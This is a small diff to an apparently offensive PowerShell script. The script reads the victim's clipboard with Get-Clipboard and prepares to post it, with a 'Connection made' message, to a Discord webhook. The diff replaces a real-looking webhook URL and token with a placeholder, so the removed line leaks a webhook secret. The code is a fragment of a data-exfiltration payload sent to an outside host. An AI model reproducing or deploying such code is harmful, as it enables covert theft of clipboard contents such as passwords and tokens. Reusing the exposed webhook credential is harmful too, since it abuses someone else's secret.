@@ -1,6 +1,6 @@
 $prev_clip = Get-Clipboard -Raw
 
-$dc = "https://discord.com/api/webhooks/1140612515286499399/u5g7s3uMCSoJNCr3chf8xqpb94Jh2lYbhn7Lrw3_jqjfxXuNUUiNACq2VNtE4UaR-dkH"
+$dc = "your discord webhook here"
 
 $body = @{
     content = "Connection made"
